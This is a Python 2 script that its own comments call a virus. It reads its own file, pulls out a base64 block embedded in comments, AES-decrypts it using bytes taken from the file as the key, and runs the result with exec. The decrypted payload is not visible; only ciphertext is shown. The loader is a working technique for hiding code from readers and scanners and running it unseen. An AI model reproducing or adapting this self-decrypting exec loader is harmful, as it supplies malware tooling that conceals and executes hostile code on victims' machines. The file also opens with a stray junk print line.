print "Hello0000000000000sfhldskjfhdjslakfhdjlksafhjldsakhfjads"

######################################################## First script python
# coding=utf-8
# Start Uncrypted
import os                        
import __main__                                     
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES
from Crypto import Random

# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(this).read(24), AES.MODE_CFB, iv)
   
   this.close()
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '# Start payload':
      copy = True
   elif line.strip() == '# End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
#e = encrypt(cipher_payload)
#print e
exec e
sys.exit('Good job!')
# End Uncrypted
# Start payload
#fJi6X+kErharId+lTufnh7atOySO3m9fwF48fWvnD3YigtJ52V2HIZ/Jx3qw1qPwspLaYXZvGs/MRhjLAdeex9mmfQ3Jb3pVanUFyJk3x6dGpaKDgqoqfBPxXRKgYxIg9po06N8fmisypXozgcwaPjqzTDZh+NsqOQS81kVJ+qGmHXr65UFFj7f/V7gRlkNk9h+4NZm73x7KI3RkexrhZ/jRNwkt7sM9jvOaLruweCGh0q2kBql5SEknD6vEkHRxoyt0vEUAsmwEPUuL63Gu7+sm7tPxPZo1o7/PcOE65zP5tHgpvPkyXZuEH8NFsMzIkn1FYoTel2q/Ahsfh0Lkfvl7yjY0WhA/VMTQFbI3VNSqTRmM3fDkhOZNC4MGDjqg2zJtZRDzo7L4z/H/kYfwk96F+5bYgtCRWzBgkzxlb2R01x6YXaLRX1nzPoHORHVFoD6bW4RvjQbfD3xeIXiHNrB4M4BEbACJT3az7zrPEHTfqikmCmrvNzgCt0PWw7zBNtsneHdK+Vn1qKpCT7Ifk6JAelFUkm0Ms79P7QWJtAcybGUBTjTrIdkcH4sxE0vAT8CgGnbToFCk4j4PsehdzCn8PVNp6j0bBmYbU4yCWfuGrmpPeoBECbBWV6CzKtMmT7tgaKvFEvGp61WCx8aigQiwpihhUJkom+5ZlPZq70WtEuJn/EaR1rpfnVdJa7b+z3oY70RQB1ktEBcqY68A4e+QAIrP6eGaoR2HY6a/hHQ2q8EKu7/GR6W5wX+EXgNYz//YJjBTszXknxG6CzpigdDt/LIW4ywtu8EbCsd6dnm6i6nPcLRniGYxkm8riIEW92zHSYTTHDAiApiJ2mpu7KF8bah3EdKQj04zqvM3tCiCHkI50tBv4V85B1akW8QscSpByldAuMUNnwaw2mqzd4Bedk+bdx0Am7jxBPLOne+i6/sgXOMRiGkKs+VoS5crRXeI7PT4n4KJosPSwAo18zQCSvNb/PhxmJLWSse/JybFdO/Sx4fisBnUTsUBYa7+AQgRC4BSuJuH1CNRjWMiqPvbIXayd2IEyRLouTzbMtNPmr5kjKOv30x1wYZlNFA+rXP7f0SW81ov4yxkwnLEiFxS247pwyCq5OaZMjF0VeCnH7Z/os1OKG0AK3dbuYiB+SlCCkMx4/rWbAn6nexwv0KMIjNiCZNdwx5VkGicwCE1v6Lq94AaBRCWuxDOqTguVFHvPgYQg9KHse8NlhmpmNiZKMqFXJFkG0AGRFwb/tN9k/qj13wXdUxrISihZrh76L+Z8gjg8fvFycipqHjsjtdQmFe2pLn0OIIqCvU0K/In/kIKFL31Wnh+xH4EtmA0GUxCYcYixdzN4J8DIDtUt5EbpiXV1f9EZbFxC+Hm6DaFvFpirmcMlhaVgPK/N2z7e1KgpKtLBVxF+7BhD0nmnFZkU2GX7Zg7bfK7oZj+eb6Y1DGr1vNFTiH4OfLTWaLgR/7arQGexvekSf+plAjFm4gbUgZfxdsMKXfi6/AfOhZimcydID91wgeqs93XfizEnFhijkcPUo1LjNB8ZTYBjy0Ly+voY8eSvTnNuIQtPr3linUoogJJXHzLAL7hRtD64G2ftrWSBf15vN0m2AeYE8h2o1Ja8qatq0mt1zSwraCq9AxDtzln/1VFrHqBDJr1DOhJSOw+c5vMTx0bx/KJ138cm/2vhbU0MGjS52t9ZTvW21XedwKUtw911u5oZwSk1PFXzMsa4Ldp2MvCpKyW+ivBjWXYdgJ0OvZ25FwI5RtphSzt3j69iAtVhyZffJKIJvXGlXDH1cXc+vjGDFDvpUzet5KAruFS9i9selizGG0ZS7KwReXhce1aAvXqTSzSf7mEeSPUVxiVzE0pjMfLpuWa0yNki8CQQaI/xc1W1jEo9XO/ZHT3O61cBgonUZ+qOoS9TguP6v2z+06sFKnSZk4uHmGYZCmbuW0AAqY4sc0/+fue6ZgcZ1d+xbOjK3C+EuIqp0eJfiFqSsgNcJdhp3moYpqXAV3fLKvnV9k33iSjKydARsK3KDoGnrLybw7W8Jf1MbMRtJcTmizPS/b7QAyVHSBAD2iuluWFJMRGGJ4Vj53H5lLIHGtxb4bPZ0pvLlbjNGUkMw2n/kjlvUi32GHbf3xvWRZLne0l+yw17+f5w55QNWBWO7AP7BBKZz2RS/NlpmPlPHHrZU/KdVyIpOk24Ex6bf9BupGvvuzJ1f2P7xe/FQtF57Y4/xdDN1FdKWS2scLQ66NEgW8yRjVsO7Zu/y598JgI4aW+cSfQ8vmTSvD2tazgj+nHJkond7WTb27bbEFyFX3V4qwOhk6/Uku1UdmiJ48zZhilcTtA8xujysNym3EBxECNk5U9HyJwwmvkN8IT7R9YtWrmXU9odILs3lLH8rg8aPfPUQSRWBjs9Fsr5muj5HOLeIIJEdWhjRrz+sI1ic4QAJRC/ZbbJe8DddD5U6JmvTFGvWrmbKYNXAMLmQgWtKLqSKajlxxwqn2YoSOlLbzy6POHJb/SycCL+OUx/mZ/uUKgrS03mbNNX1kH/notRCDQKoK9peCK31ARi4GK2vwplj7Tz7MTiVhgYEy35cqSuZq2w412r7r7yPuFGl9hfVzmR4LZ6SL35id1qk65aeGAurKA9ym5hVNvil5YK3OkGpT5QuS6ttrocqSQTbreoP257Gr7rwQTO0FeaoP+Ln1tPZmv+y/7IS8ZCQfrSg3SH9PWcqxo1bl6J0rbqmO3OCXA
# End payload